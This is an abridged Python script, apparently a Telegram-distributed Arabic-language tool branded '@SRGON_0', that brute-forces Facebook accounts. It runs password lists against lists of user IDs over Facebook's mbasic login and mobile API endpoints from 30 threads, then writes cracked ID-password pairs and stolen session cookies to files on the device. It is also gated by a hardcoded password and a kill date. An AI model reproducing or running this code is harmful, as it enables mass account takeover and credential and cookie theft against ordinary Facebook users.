...
import sys
import os
os.system('xdg-open https://t.me/CR7_7sr')
...
g= datetime.datetime(2024, 4, 28, 12, 0 ,0) #اهنا تكدر تتحكم بالوقت مثل السنه والشهر واليوم والساعه والدقيقة والثانية الي تريد الأداة تتوقف بيها
if (x.strftime("%x"))>(g.strftime("%x")):
 print('تم توقيف الادات @SRGON_0')
else:
  print(" ")
  os.system("clear")
 #ضيف كود مالتك اهنا 👇
...
toor=input ('\033[1;94m  ادخل كلمه السر ؟:\033[1;36m  ' )
jkss='CR7'
if jkss ==toor:
 pas='toor'
 print('  ')
 print("\x1b[38;5;14m       الباسورد صح ✔️.   ")
else:
 print('  ')
 exit('\x1b[38;5;196m     الباسورد خطاء ؟    ')

print('\033[1;31m الملك الاكدي 🥶...')
print('\033[2;32m انتظر يتم تشغيل الاداه 🌚...')
...
logo=("""\x1b[38;5;220m
                ♕ The Akkadian SRGON_0 ♕
                ♕ @CR7_7sr ♕⠀⠀
                                 🔥@SADSION_1🔥⠀
_____ ____  __________  _   __
  / ___// __ \/ ____/ __ \/ | / /
  \__ \/ /_/ / / __/ / / /  |/ / 
 ___/ / _, _/ /_/ / /_/ / /|  /  
/____/_/ |_|\____/\____/_/ |_/
\033[1;96m ━━━━━━━━━━━━━━━━━\033[1;31\33[38;5;196m━━━━━━━━━━━━━━━━━━
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;34mDEVELOPER  : الملك سرجون
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mMY CHANNEL : @CR7_7sr
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;34mTELEGRAM   : @SRGON_0
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mVERSON     : v1.5
\033[1;96m ━━━━━━━━━━━━━━━━━\033[1;31\33[38;5;196m━━━━━━━━━━━━━━━━━━
""")
                               
def linex():
        print('\033[1;37mᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ')
def clear():
        os.system('clear')
        print(('\033[92m—'*25)+'\n• BY  @SRGON_0•\n'+('—'*25))
        print(logo)
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print(' \x1b[1;93mعدد ملف الايديات ✅ : \033[1;32m'+total_ids)
                        linex()
                        for user in id:
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print('\x1b[1;91m [01] \x1b[1;92mباسوردات قويه وخفيفه ✅  \n\x1b[1;91m [03] \x1b[1;94mباسوردات مواليد فقط 🟥 ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93m عدد ايديات ملفك 🔥 : \033[1;32m'+total_ids)
                                        print("\033[1;32m تم التشغيل 🔥")
                                        print("\x1b[95mارسال صور الصيد @SRGON_0")
                                        linex()
...
def india():
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        print(f'\033[1;32m Use airplane mode for speed up ')
                        linex()
                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/KING-SRGON-OK.TXT")
                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/KING-SRGON-CP.TXT")
                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/KING-SRGON-COOKIE.TXT")
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32m@SRGON_0\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'authority': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9,ar-US;q=0.8,ar;q=0.7','cache-control': 'max-age=0','dpr': '2','referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfeRstViFBwWR-RMBQlsbIdZTEvfNh1nC_GYKhHXENC04VtvXyQivs0NK48ur9lUIYUpvwe15s3uzqgY-2ZAa9XwY9A5tDoOF1gYQjTtEIQqiw&smuh=24350&lh=Ac9HMCJbrWc-14j8_cg&wtsid=rdr_0EWF5VKeOWubJZ85J&_rdr','sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"iOS"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua,'viewport-width': '980',}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [@SRGON_0-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/@SRGON_0-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@SRGON_0-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@SRGON_0-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@SRGON_0-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@SRGON_0] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@SRGON_0-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@SRGON_0-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print('\033[1;31m [@SRGON_0-CP] '+ids+' | '+pas+'\033[1;31m')
                                                open('/sdcard/@SRGON_0-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
        ...
        sys.stdout.write('\x1b[1;97m [@SRGON_0] [%s] \033[1;37m[OK=%s] [%s%%] \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        try:
                for pas in passlist:
                        application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        application_version_code=str(random.randint(000000000,999999999))
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@SRGON_0-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@SRGON_0-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@SRGON_0-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@SRGON_0-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@SRGON_0-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
